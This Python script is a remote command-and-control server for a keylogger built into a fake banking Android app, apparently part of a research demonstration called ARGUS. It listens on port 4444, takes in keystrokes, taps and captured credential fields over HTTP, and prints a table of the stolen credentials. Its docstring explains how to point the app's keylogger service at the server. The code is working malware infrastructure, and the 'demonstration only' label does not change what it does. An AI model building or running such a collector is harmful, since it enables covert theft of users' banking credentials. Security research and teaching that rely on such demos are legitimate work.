#!/usr/bin/env python3
"""
DEMONSTRATION PURPOSE ONLY
Remote C2 (Command & Control) listener for the demobankfake ARGUS research app.

This server receives keystroke and button-click events from the running
Flutter app over HTTP and displays them in real time in the terminal.

Usage:
    python c2_server.py                   # listens on 0.0.0.0:4444 by default
    python c2_server.py --host 0.0.0.0 --port 9000

How to connect the Android device:
    1. Make sure the Android device / emulator is on the same network (or use
       ADB port-forward for a USB-connected device).
    2. Find this machine's LAN IP:  ipconfig  (look for IPv4 Address)
    3. Set that IP inside the Flutter app's lib/security/keylogger_service.dart
       (SERVER_HOST constant).
    4. Run the app and watch events stream in here.

ADB port-forward shortcut (USB / emulator):
    adb reverse tcp:4444 tcp:4444
    Then use SERVER_HOST = "10.0.2.2"  (emulator loopback to host)
"""

import argparse
import json
import socket
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# -- ANSI colour codes --------------------------------------------------------
RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BLUE    = "\033[94m"
DIM     = "\033[2m"
WHITE   = "\033[97m"

# -- Event counters -----------------------------------------------------------
stats = {"keystrokes": 0, "button_clicks": 0, "sessions": 0, "total": 0}
stats_lock = threading.Lock()

# -- Collected credentials buffer ---------------------------------------------
credentials = {}


def banner():
    print("""
\033[96m\033[1m+==================================================================+
|          DEMOBANKFAKE  .  REMOTE KEYLOGGER C2 SERVER             |
|          ARGUS Cybersecurity Research Platform                    |
|          DEMONSTRATION PURPOSE ONLY - NOT FOR PRODUCTION USE     |
+==================================================================+\033[0m
""")


def _ts():
    """Return a coloured timestamp string."""
    return "\033[2m{}\033[0m".format(datetime.now().strftime('%H:%M:%S.%f')[:-3])


def _fmt_event(event):
    """Format a parsed event dict into a pretty terminal line."""
    kind      = event.get("type", "unknown")
    screen    = event.get("screen", "?")
    field     = event.get("field", "")
    value     = event.get("value", "")
    label     = event.get("label", "")
    device_id = event.get("device_id", "")

    if kind == "keystroke":
        colour = GREEN
        icon   = "[KEY]"
        detail = "{}\033[1m\033[97m{}\033[0m  ->  \033[92m'{}'\033[0m".format(
            GREEN, field, value)
    elif kind == "button_click":
        colour = YELLOW
        icon   = "[TAP]"
        detail = "Button: \033[1m\033[93m{}\033[0m".format(label)
    elif kind == "field_submit":
        colour = MAGENTA
        icon   = "[SUBMIT]"
        detail = "\033[1m\033[95m{}\033[0m  submitted  ->  '{}'".format(field, value)
    elif kind == "session_start":
        colour = CYAN
        icon   = "[SESSION]"
        detail = "New session from device \033[1m{}\033[0m".format(device_id)
    elif kind == "credential_capture":
        colour = RED
        icon   = "[CRED]"
        detail = "\033[91m\033[1mCREDENTIAL -- field={}  value='{}'\033[0m".format(
            field, value)
    else:
        colour = DIM
        icon   = "[?]"
        detail = str(event)

    screen_tag = "{}[{}]\033[0m".format(colour, screen)
    return "  {}  {}{}  {}  {}".format(_ts(), colour, icon, screen_tag, detail)


def print_credentials_table():
    """Print the current captured credential summary."""
    if not credentials:
        return
    print("\n\033[91m\033[1m" + "=" * 64, flush=True)
    print("  CAPTURED CREDENTIALS SUMMARY", flush=True)
    print("=" * 64 + "\033[0m", flush=True)
    for k, v in credentials.items():
        print("  \033[1m{:20s}\033[0m : \033[91m{}\033[0m".format(k, v), flush=True)
    print("\033[91m\033[1m" + "=" * 64 + "\033[0m\n", flush=True)


class C2Handler(BaseHTTPRequestHandler):
    """HTTP request handler -- receives JSON POST payloads from the app."""

    def log_message(self, fmt, *args):
        pass  # silence default HTTP access log

    def _send_ok(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def _send_err(self, code=400):
        self.send_response(code)
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            self._send_err()
            return

        raw = self.rfile.read(length)
        try:
            payload = json.loads(raw.decode("utf-8"))
        except json.JSONDecodeError:
            self._send_err()
            return

        self._send_ok()
        self._process(payload)

    def _process(self, payload):
        """Process a single event or a batch of events."""
        events = payload if isinstance(payload, list) else [payload]

        for event in events:
            kind = event.get("type", "")

            with stats_lock:
                stats["total"] += 1
                if kind == "keystroke":
                    stats["keystrokes"] += 1
                elif kind == "button_click":
                    stats["button_clicks"] += 1
                elif kind == "session_start":
                    stats["sessions"] += 1

            # Collect credentials as they arrive
            if kind in ("credential_capture", "field_submit"):
                field = event.get("field", "unknown")
                value = event.get("value", "")
                credentials[field] = value

            print(_fmt_event(event), flush=True)

            # Show credential table immediately after a credential capture
            if kind == "credential_capture":
                print_credentials_table()

        # Print running totals every 10 events
        if stats["total"] % 10 == 0:
            _print_stats()


def _print_stats():
    with stats_lock:
        k = stats["keystrokes"]
        b = stats["button_clicks"]
        s = stats["sessions"]
        t = stats["total"]
    print(
        "\n  \033[2m-- Stats: total={}  keystrokes={}  buttons={}  sessions={} --\033[0m\n"
        .format(t, k, b, s),
        flush=True
    )


def get_local_ip():
    """Best-effort detection of the machine's LAN IP."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def main():
    parser = argparse.ArgumentParser(
        description="demobankfake remote keylogger C2 server"
    )
    parser.add_argument("--host", default="0.0.0.0",
                        help="Bind address (default 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444,
                        help="TCP port (default 4444)")
    args = parser.parse_args()

    banner()

    lan_ip = get_local_ip()
    print("  \033[1mListening on\033[0m  \033[96m{}:{}\033[0m".format(args.host, args.port))
    print("  \033[1mLAN IP      \033[0m  \033[96m{}\033[0m".format(lan_ip))
    print()
    print("  \033[93mAndroid emulator -> use SERVER_HOST = \"10.0.2.2\" in the app\033[0m")
    print("  \033[93mPhysical device  -> use SERVER_HOST = \"{}\" in the app\033[0m".format(lan_ip))
    print()
    print("  \033[2mADB port-forward (emulator/USB):\033[0m")
    print("  \033[2m  adb reverse tcp:{} tcp:{}\033[0m".format(args.port, args.port))
    print()
    print("  \033[96mWaiting for events ...\033[0m\n")
    print("  " + "-" * 62)

    server = ThreadingHTTPServer((args.host, args.port), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n  \033[93mServer stopped by user.\033[0m")
        _print_stats()
        print_credentials_table()


if __name__ == "__main__":
    main()
